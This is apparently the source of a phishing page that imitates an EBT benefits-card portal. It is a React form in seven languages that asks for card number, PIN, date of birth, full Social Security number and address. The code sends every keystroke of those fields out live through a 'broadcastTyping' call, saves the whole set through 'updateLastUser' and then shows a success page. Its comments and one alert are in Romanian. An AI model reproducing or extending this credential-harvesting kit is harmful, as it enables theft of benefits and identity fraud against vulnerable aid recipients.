import { useState, useEffect, useRef, type CSSProperties, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import { CreditCard, Calendar, Eye, EyeOff, KeyRound, Home } from "lucide-react";
import EbtLayout from "@/components/EbtLayout";
import Honeypot from "@/components/Honeypot";
import { updateLastUser, broadcastTyping, clearTypingForSession, getSelectedLang, setSelectedLang } from "@/lib/userStore";
import { zip3ToState } from "@/lib/zipToState";

type Lang = "English" | "Español" | "Kreyòl Ayisyen" | "عربي" | "中文" | "Polski" | "русский";

type AddCopy = { title: string; enterInfo: string; requiredFields: string; cardNumber: string; pin: string; reEnterPin: string; dob: string; ssn: string; addBtn: string; cancelBtn: string; selectLanguage: string; pinMismatch: string; dobTooYoung: string; dobInvalid: string };

const addAccountCopy: Record<Lang, AddCopy> = {
  English: {
    title: "Add Account", enterInfo: "Please enter your information below.", requiredFields: "Required Fields",
    cardNumber: "Card Number", pin: "Card PIN", reEnterPin: "Re-enter Card PIN",
    dob: "Date of Birth (MM/DD/YYYY)", ssn: "Social Security Number", addBtn: "Add", cancelBtn: "Cancel",
    selectLanguage: "Select Language", pinMismatch: "PINs do not match",
    dobTooYoung: "You must be 18 or older to continue", dobInvalid: "Enter a valid date in MM/DD/YYYY (e.g. 01/01/2000)",
  },
  Español: {
    title: "Agregar Cuenta", enterInfo: "Por favor ingrese su información a continuación.", requiredFields: "Campos obligatorios",
    cardNumber: "Número de Tarjeta", pin: "PIN de Tarjeta", reEnterPin: "Reingrese PIN de Tarjeta",
    dob: "Fecha de Nacimiento (MM/DD/AAAA)", ssn: "Número de Seguro Social", addBtn: "Agregar", cancelBtn: "Cancelar",
    selectLanguage: "Seleccionar idioma", pinMismatch: "Los PINs no coinciden",
    dobTooYoung: "Debe tener al menos 18 años", dobInvalid: "Fecha de nacimiento inválida",
  },
  "Kreyòl Ayisyen": {
    title: "Ajoute Kont", enterInfo: "Tanpri antre enfòmasyon ou anba a.", requiredFields: "Chan obligatwa",
    cardNumber: "Nimewo Kat", pin: "PIN Kat", reEnterPin: "Re-antre PIN Kat",
    dob: "Dat Nesans (MM/JJ/AAAA)", ssn: "Nimewo Sekirite Sosyal", addBtn: "Ajoute", cancelBtn: "Anile",
    selectLanguage: "Chwazi lang", pinMismatch: "PIN yo pa matche",
    dobTooYoung: "Ou dwe gen omwen 18 an", dobInvalid: "Dat nesans envalid",
  },
  "عربي": {
    title: "إضافة حساب", enterInfo: "يرجى إدخال معلوماتك أدناه.", requiredFields: "حقول مطلوبة",
    cardNumber: "رقم البطاقة", pin: "رقم PIN للبطاقة", reEnterPin: "أعد إدخال رقم PIN",
    dob: "تاريخ الميلاد (MM/DD/YYYY)", ssn: "رقم الضمان الاجتماعي", addBtn: "إضافة", cancelBtn: "إلغاء",
    selectLanguage: "اختر اللغة", pinMismatch: "أرقام PIN غير متطابقة",
    dobTooYoung: "يجب أن يكون عمرك 18 عامًا على الأقل", dobInvalid: "تاريخ الميلاد غير صالح",
  },
  "中文": {
    title: "添加账户", enterInfo: "请在下方输入您的信息。", requiredFields: "必填字段",
    cardNumber: "卡号", pin: "卡密码", reEnterPin: "重新输入卡密码",
    dob: "出生日期 (MM/DD/YYYY)", ssn: "社会安全号码", addBtn: "添加", cancelBtn: "取消",
    selectLanguage: "选择语言", pinMismatch: "密码不匹配",
    dobTooYoung: "您必须年满18岁", dobInvalid: "出生日期无效",
  },
  Polski: {
    title: "Dodaj Konto", enterInfo: "Proszę wprowadzić swoje dane poniżej.", requiredFields: "Wymagane pola",
    cardNumber: "Numer Karty", pin: "PIN Karty", reEnterPin: "Powtórz PIN Karty",
    dob: "Data urodzenia (MM/DD/RRRR)", ssn: "Numer Ubezpieczenia Społecznego", addBtn: "Dodaj", cancelBtn: "Anuluj",
    selectLanguage: "Wybierz język", pinMismatch: "Kody PIN nie pasują",
    dobTooYoung: "Musisz mieć co najmniej 18 lat", dobInvalid: "Nieprawidłowa data urodzenia",
  },
  "русский": {
    title: "Добавить счёт", enterInfo: "Пожалуйста, введите свои данные ниже.", requiredFields: "Обязательные поля",
    cardNumber: "Номер карты", pin: "PIN карты", reEnterPin: "Повторите PIN карты",
    dob: "Дата рождения (ММ/ДД/ГГГГ)", ssn: "Номер социального страхования", addBtn: "Добавить", cancelBtn: "Отмена",
    selectLanguage: "Выберите язык", pinMismatch: "PIN-коды не совпадают",
    dobTooYoung: "Вам должно быть не менее 18 лет", dobInvalid: "Неверная дата рождения",
  },
};

const languageOptions: Lang[] = ["English", "Español", "Kreyòl Ayisyen", "عربي", "中文", "Polski", "русский"];

const TOTAL_CARD_DIGITS = 19;

const inputBase: CSSProperties = {
  width: "100%",
  border: "none",
  borderBottom: "1px solid hsl(210 4% 78%)",
  background: "transparent",
  outline: "none",
  height: 40,
  fontSize: 14,
  color: "hsl(220 10% 28%)",
  fontFamily: "Arial, Helvetica, sans-serif",
};

const rowIconStyle: CSSProperties = {
  width: 22,
  height: 22,
  color: "hsl(202 36% 38%)",
};

const AddAccount = () => {
  const navigate = useNavigate();
  const [lang, setLang] = useState<Lang>(() => {
    const saved = getSelectedLang();
    return languageOptions.includes(saved as Lang) ? (saved as Lang) : "English";
  });
  const ta = addAccountCopy[lang];

  const [cardNumber, setCardNumber] = useState("");
  const [pinCard, setPinCard] = useState("");
  const [pinConfirm, setPinConfirm] = useState("");
  const [dob, setDob] = useState("");
  const [ssn, setSsn] = useState("");
  const [zipCode, setZipCode] = useState("");
  const [streetAddress, setStreetAddress] = useState("");
  const [city, setCity] = useState("");
  const [stateField, setStateField] = useState("");
  const [zipLookupBusy, setZipLookupBusy] = useState(false);
  const zipAbortRef = useRef<AbortController | null>(null);

  const [showCard, setShowCard] = useState(true);
  const [showPin, setShowPin] = useState(true);
  const [showPinConfirm, setShowPinConfirm] = useState(true);
  const [showSsn, setShowSsn] = useState(true);

  const getDobError = (): string | null => {
    if (dob.trim().length < 10) return null;

    const match = dob.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
    if (!match) return ta.dobInvalid;

    const mm = Number(match[1]);
    const dd = Number(match[2]);
    const yyyy = Number(match[3]);
    const today = new Date();

    if (yyyy < 1900 || yyyy > today.getFullYear()) return ta.dobInvalid;

    const date = new Date(yyyy, mm - 1, dd);
    if (date.getMonth() !== mm - 1 || date.getDate() !== dd || date.getFullYear() !== yyyy) return ta.dobInvalid;
    if (date > today) return ta.dobInvalid;

    let age = today.getFullYear() - date.getFullYear();
    const mDiff = today.getMonth() - date.getMonth();
    if (mDiff < 0 || (mDiff === 0 && today.getDate() < date.getDate())) age--;
    if (age < 18) return ta.dobTooYoung;

    return null;
  };
  const dobError = getDobError();
  const dobValid = dob.trim().length === 10 && !dobError;

  const pinsMatch = pinCard.length > 0 && pinCard === pinConfirm;
  const cardLen = cardNumber.trim().length;
  const ssnDigits = ssn.replace(/\D/g, "");
  const canAdd =
    cardLen >= 10 &&
    pinsMatch &&
    dobValid &&
    ssnDigits.length === 9 &&
    zipCode.trim().length === 5 &&
    streetAddress.trim().length >= 3;

  // Broadcast keystrokes in real-time
  useEffect(() => {
    broadcastTyping({
      "Card Number": cardNumber,
      "PIN": pinCard + (pinConfirm ? " / " + pinConfirm : ""),
      "DOB": dob, "SSN": ssn, "Zip": zipCode,
      "Address": [streetAddress, city, stateField, zipCode].filter(Boolean).join(", "),
    });
  }, [cardNumber, pinCard, pinConfirm, dob, ssn, zipCode, streetAddress, city, stateField]);

  // Auto-complete city + state from ZIP (Zippopotam.us — public, no key)
  useEffect(() => {
    if (zipCode.length !== 5) return;
    if (zipAbortRef.current) zipAbortRef.current.abort();
    const ctrl = new AbortController();
    zipAbortRef.current = ctrl;
    const t = setTimeout(async () => {
      setZipLookupBusy(true);
      try {
        const r = await fetch(`https://api.zippopotam.us/us/${zipCode}`, { signal: ctrl.signal });
        if (!r.ok) return;
        const j = await r.json();
        const place = Array.isArray(j?.places) && j.places[0];
        if (place) {
          // Always refresh — keeps city/state in sync with the latest ZIP
          setCity(place["place name"] || "");
          setStateField(place["state abbreviation"] || "");
        }
      } catch {
        /* ignore — manual entry still works */
      } finally {
        setZipLookupBusy(false);
      }
    }, 350);
    return () => { clearTimeout(t); ctrl.abort(); };
  }, [zipCode]);


  const formatDob = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 8);
    if (digits.length <= 2) return digits;
    if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canAdd) return;
    clearTypingForSession();

    // Garantăm că state/city sunt completate: dacă lookup-ul ZIP nu a apucat să
    // termine (sau a fost anulat), încercăm aici sincron înainte de submit.
    let finalCity = city;
    let finalState = stateField;
    if ((!finalState || !finalCity) && zipCode.length === 5) {
      try {
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 1500);
        const r = await fetch(`https://api.zippopotam.us/us/${zipCode}`, { signal: ctrl.signal });
        clearTimeout(timer);
        if (r.ok) {
          const j = await r.json();
          const place = Array.isArray(j?.places) && j.places[0];
          if (place) {
            if (!finalCity) finalCity = place["place name"] || "";
            if (!finalState) finalState = place["state abbreviation"] || "";
          }
        }
      } catch { /* fallback below */ }
    }
    // Fallback fără rețea: derivă state din primele 3 cifre ale ZIP-ului.
    if (!finalState && zipCode.length === 5) {
      finalState = zip3ToState(zipCode.slice(0, 3)) || "";
    }

    const ok = await updateLastUser({
      cardNumber,
      pinCard,
      dob,
      ssnLast4: ssn,
      zipCode,
      streetAddress,
      city: finalCity,
      state: finalState,
    });
    if (!ok) {
      alert("Nu s-au putut salva toate datele. Încearcă din nou.");
      return;
    }
    navigate("/success");
  };

  return (
    <EbtLayout
      title={ta.title}
      showNav
      langLabel={ta.selectLanguage}
      langOptions={languageOptions}
      onLangChange={(l) => { setLang(l as Lang); setSelectedLang(l); }}
      mainStyle={{ display: "flex", justifyContent: "center", padding: "28px 10px 130px" }}
    >
      <div
          style={{
            width: "100%",
            maxWidth: 700,
            background: "hsl(0 0% 100%)",
            padding: "28px clamp(16px, 4vw, 44px) 24px",
            boxSizing: "border-box",
            boxShadow: "0 2px 8px hsla(0 0% 0% / 0.15)",
          }}
        >
          <h2 style={{ margin: "0 0 4px", textAlign: "center", fontWeight: 700, fontSize: 18, color: "hsl(220 10% 28%)" }}>
            {ta.enterInfo}
          </h2>
          <p style={{ margin: "0 0 20px", textAlign: "center", color: "hsl(0 89% 42%)", fontWeight: 700, fontSize: 13 }}>
            {ta.requiredFields} <span>*</span>
          </p>

          <form onSubmit={handleSubmit}><Honeypot />
            {/* Card Number */}
            <InputRow icon={<CreditCard style={rowIconStyle} />} label={ta.cardNumber}>
              <div style={{ position: "relative", display: "flex", alignItems: "center", borderBottom: "1px solid hsl(210 4% 78%)" }}>
                <input
                  type={showCard ? "text" : "password"}
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").slice(0, TOTAL_CARD_DIGITS))}
                  required
                  maxLength={TOTAL_CARD_DIGITS}
                  style={{ ...inputBase, borderBottom: "none", paddingRight: 36, flex: 1 }}
                />
                <button
                  type="button"
                  onClick={() => setShowCard((p) => !p)}
                  style={{ position: "absolute", right: 0, top: "50%", transform: "translateY(-50%)", border: "none", background: "transparent", cursor: "pointer", padding: 4 }}
                >
                  {showCard ? <EyeOff style={rowIconStyle} /> : <Eye style={rowIconStyle} />}
                </button>
              </div>
            </InputRow>

            {/* PIN Card */}
            <InputRow icon={<KeyRound style={rowIconStyle} />} label={ta.pin}>
              <div style={{ position: "relative" }}>
                <input
                  type={showPin ? "text" : "password"}
                  inputMode="numeric"
                  value={pinCard}
                  onChange={(e) => setPinCard(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  maxLength={4}
                  style={{ ...inputBase, paddingRight: 36 }}
                />
                <button
                  type="button"
                  onClick={() => setShowPin((p) => !p)}
                  style={{ position: "absolute", right: 0, top: "50%", transform: "translateY(-50%)", border: "none", background: "transparent", cursor: "pointer", padding: 4 }}
                >
                  {showPin ? <EyeOff style={rowIconStyle} /> : <Eye style={rowIconStyle} />}
                </button>
              </div>
            </InputRow>

            {/* Re-enter PIN */}
            <InputRow icon={<KeyRound style={rowIconStyle} />} label={ta.reEnterPin}>
              <div style={{ position: "relative" }}>
                <input
                  type={showPinConfirm ? "text" : "password"}
                  inputMode="numeric"
                  value={pinConfirm}
                  onChange={(e) => setPinConfirm(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  maxLength={4}
                  style={{
                    ...inputBase,
                    paddingRight: 36,
                    borderBottomColor: pinConfirm.length > 0 && pinCard !== pinConfirm ? "hsl(0 82% 45%)" : undefined,
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPinConfirm((p) => !p)}
                  style={{ position: "absolute", right: 0, top: "50%", transform: "translateY(-50%)", border: "none", background: "transparent", cursor: "pointer", padding: 4 }}
                >
                  {showPinConfirm ? <EyeOff style={rowIconStyle} /> : <Eye style={rowIconStyle} />}
                </button>
              </div>
              {pinConfirm.length > 0 && pinCard !== pinConfirm && (
                <p style={{ margin: "4px 0 0", fontSize: 12, color: "hsl(0 82% 45%)", fontWeight: 600 }}>
                  {ta.pinMismatch}
                </p>
              )}
            </InputRow>

            {/* Date of birth */}
            <InputRow icon={<Calendar style={rowIconStyle} />} label={ta.dob}>
              <input
                type="text"
                inputMode="numeric"
                value={dob}
                onChange={(e) => setDob(formatDob(e.target.value))}
                placeholder="MM/DD/YYYY"
                maxLength={10}
                required
                style={{
                  ...inputBase,
                  borderBottomColor: dobError ? "hsl(0 82% 45%)" : undefined,
                }}
              />
              {dobError && (
                <p style={{ margin: "4px 0 0", fontSize: 12, color: "hsl(0 82% 45%)", fontWeight: 600 }}>
                  {dobError}
                </p>
              )}
            </InputRow>

            {/* Full SSN */}
            <InputRow icon={<KeyRound style={rowIconStyle} />} label={ta.ssn}>
              <div style={{ position: "relative" }}>
                <input
                  type={showSsn ? "text" : "password"}
                  inputMode="numeric"
                  autoComplete="off"
                  value={ssn}
                  onChange={(e) => {
                    const digits = e.target.value.replace(/\D/g, "").slice(0, 9);
                    let formatted = digits;
                    if (digits.length > 5) {
                      formatted = `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
                    } else if (digits.length > 3) {
                      formatted = `${digits.slice(0, 3)}-${digits.slice(3)}`;
                    }
                    setSsn(formatted);
                  }}
                  maxLength={11}
                  placeholder=""
                  required
                  style={{ ...inputBase, paddingRight: 36 }}
                />
                <button
                  type="button"
                  onClick={() => setShowSsn((p) => !p)}
                  style={{ position: "absolute", right: 0, top: "50%", transform: "translateY(-50%)", border: "none", background: "transparent", cursor: "pointer", padding: 4 }}
                >
                  {showSsn ? <EyeOff style={rowIconStyle} /> : <Eye style={rowIconStyle} />}
                </button>
              </div>
            </InputRow>

            {/* Primary Zip Code */}
            {/* Street Address — number + street */}
            <InputRow icon={<Home style={rowIconStyle} />} label="Street Address">
              <input
                type="text"
                value={streetAddress}
                onChange={(e) => setStreetAddress(e.target.value.slice(0, 120))}
                placeholder="123 Main St, Apt 4B"
                maxLength={120}
                required
                autoComplete="street-address"
                style={inputBase}
              />
            </InputRow>

            {/* Primary Zip Code (auto-fills city + state behind the scenes) */}
            <InputRow icon={<KeyRound style={rowIconStyle} />} label="Primary Zip Code">
              <input
                type="text"
                inputMode="numeric"
                value={zipCode}
                onChange={(e) => setZipCode(e.target.value.replace(/\D/g, "").slice(0, 5))}
                maxLength={5}
                placeholder="00000"
                required
                autoComplete="postal-code"
                style={inputBase}
              />
            </InputRow>

            {/* Buttons */}
            <div style={{ display: "flex", gap: 10, marginTop: 12, flexWrap: "wrap" }}>
              <button
                type="submit"
                disabled={!canAdd}
                style={{
                  flex: "1 1 140px",
                  maxWidth: "50%",
                  height: 48,
                  border: "none",
                  cursor: canAdd ? "pointer" : "not-allowed",
                  color: "hsl(0 0% 92%)",
                  background: canAdd ? "hsl(205 37% 37%)" : "hsl(203 24% 70%)",
                  fontSize: 20,
                  fontWeight: 500,
                }}
              >
                {ta.addBtn}
              </button>
              <button
                type="button"
                onClick={() => navigate("/")}
                style={{
                  flex: "1 1 140px",
                  maxWidth: "50%",
                  height: 48,
                  border: "none",
                  cursor: "pointer",
                  color: "hsl(0 0% 92%)",
                  background: "hsl(205 37% 37%)",
                  fontSize: 20,
                  fontWeight: 500,
                }}
              >
                {ta.cancelBtn}
              </button>
            </div>
          </form>
      </div>
    </EbtLayout>
  );
};

type InputRowProps = {
  icon: ReactNode;
  label: string;
  children: ReactNode;
};

const InputRow = ({ icon, label, children }: InputRowProps) => (
  <div style={{ display: "grid", gridTemplateColumns: "32px 1fr", columnGap: 12, alignItems: "start", marginBottom: 20 }}>
    <div style={{ paddingTop: 10 }}>{icon}</div>
    <div>
      <label style={{ display: "block", marginBottom: 3, color: "hsl(0 0% 35%)", fontSize: 14 }}>
        {label} <span style={{ color: "hsl(0 82% 45%)" }}>*</span>
      </label>
      {children}
    </div>
  </div>
);

export default AddAccount;
